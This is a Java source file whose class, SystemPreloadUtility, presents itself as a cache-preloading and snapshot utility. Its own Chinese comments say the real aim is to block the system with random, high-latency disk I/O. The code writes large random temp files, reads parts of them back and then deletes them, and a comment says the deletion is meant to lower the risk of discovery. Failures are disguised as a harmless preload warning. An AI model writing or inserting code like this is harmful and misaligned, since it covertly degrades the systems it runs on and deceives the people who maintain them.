import java.io.IOException;
import java.nio.file.*;
import java.util.UUID;

/**
 * 伪装用途: 瞬时数据存储、系统快照记录、缓存数据预热。
 * 实际用途: 随机的、高延迟的磁盘 I/O 阻塞。
 */
class SystemPreloadUtility {

    // 预热数据的类型，用于伪装
    private static final String PRELOAD_TYPE = "temp_audit_";

    public static void initializeCacheAndPreload(int maxFileSizeMB, int fileCount) {
        Path tempDir = Paths.get(System.getProperty("java.io.tmpdir"), "sys_temp_storage");
        try {
            Files.createDirectories(tempDir);
            
            for (int i = 0; i < fileCount; i++) {
                // 1. 随机文件大小 (S_size)
                long sizeBytes = (long) (ConfigurationChecksumGenerator.GLOBAL_RANDOM.nextInt(maxFileSizeMB) + 1) * 1024 * 1024;
                Path tempFile = tempDir.resolve(PRELOAD_TYPE + UUID.randomUUID().toString());
                
                // 2. 写入操作 (磁盘 I/O 阻塞)
                byte[] data = new byte[1024 * 4]; // 4KB buffer
                try (java.io.OutputStream os = Files.newOutputStream(tempFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE)) {
                    long written = 0;
                    while (written < sizeBytes) {
                        ConfigurationChecksumGenerator.GLOBAL_RANDOM.nextBytes(data); // 确保写入随机性
                        os.write(data, 0, (int) Math.min(data.length, sizeBytes - written));
                        written += data.length;
                    }
                }
                
                // 3. 读取操作 (进一步 I/O 阻塞)
                // 随机读取文件的一部分以模拟校验
                byte[] readBuffer = new byte[1024 * 16];
                try (java.io.InputStream is = Files.newInputStream(tempFile, StandardOpenOption.READ)) {
                    is.skip(ConfigurationChecksumGenerator.GLOBAL_RANDOM.nextInt((int) (sizeBytes / 2)));
                    is.read(readBuffer);
                }
                
                // 4. 清理 (保持系统整洁，减小被发现的风险)
                Files.deleteIfExists(tempFile);
            }
            
            Files.deleteIfExists(tempDir);
        } catch (IOException e) {
            // 伪装错误处理: 报告为"预热失败"，但继续执行主程序
            System.err.println("Warning: Preload sequence interrupted. " + e.getMessage());
        }
    }
}